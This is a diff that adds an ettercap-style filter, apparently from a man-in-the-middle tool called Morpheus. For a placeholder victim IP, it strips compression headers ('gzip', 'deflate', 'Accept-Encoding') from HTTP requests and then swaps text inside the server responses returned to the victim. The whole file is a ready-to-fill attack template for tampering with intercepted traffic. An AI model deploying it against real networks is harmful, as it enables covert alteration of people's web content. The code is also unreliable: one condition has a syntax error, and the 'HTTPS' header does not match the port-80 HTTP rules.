@@ -1,0 +1,69 @@
+############################################################################
+#                                                                          #
+#  HTTPS Request/Response Filter                                           #
+#  based on code from ALoR & NaGA                                          #
+#                                                                          #
+#  This program is free software; you can redistribute it and/or modify    #
+#  it under the terms of the GNU General Public License as published by    #
+#  the Free Software Foundation; either version 2 of the License, or       #
+#  (at your option) any later version.                                     #
+#                                                                          #
+############################################################################
+
+
+##
+#  This filter will replace certain words in tcp packet
+#  requests befor forward the packet back to target host.
+##
+
+
+
+
+##########################
+## Zap Content Encoding ##
+##########################
+# change target request to server
+if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
+  msg("[morpheus] host:IpAdDR   [ <- ]  port:80 http ☆");
+  msg("[Morpheus] | status: replacing packet content!");
+  if (search(DATA.data, "gzip")) {
+    replace("gzip", "    "); # note: four spaces In the replacement string
+    msg("[Morpheus] |  packet string gzip zapped ✔");
+  }
+}
+
+if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
+  if (search(DATA.data, "deflate")) {
+    replace("deflate", "       "); # note: seven spaces In the replacement string
+    msg("[Morpheus] |  packet string deflate zapped ✔");
+  }
+}
+
+if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
+  if (search(DATA.data, "Accept-Encoding")) {
+    replace("Accept-Encoding", "Accept-Rubbish!");
+    msg("[Morpheus] |  packet Accept-Encoding zapped ✔");
+  }else{
+  if (search(DECODED.data, "Accept-Encoding")) {
+    replace("Accept-Encoding", "Accept-Rubbish!");
+    msg("[Morpheus] |  packet Accept-Encoding zapped ✔");
+  }
+  }
+}
+
+
+
+
+#####################
+## Replace Content ##
+#####################
+# change server response to target
+if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.src == 80) {
+  if search(DATA.data, "RePlAcE")){
+    # note: since we are replacing webpage body letters its advice 'for'
+    # the replacement string to have the same length of the injected one.
+    replace("RePlAcE", "InJeC");
+    msg("[morpheus] |_ packet forward back to target ✔\n");
+  }
+}
+
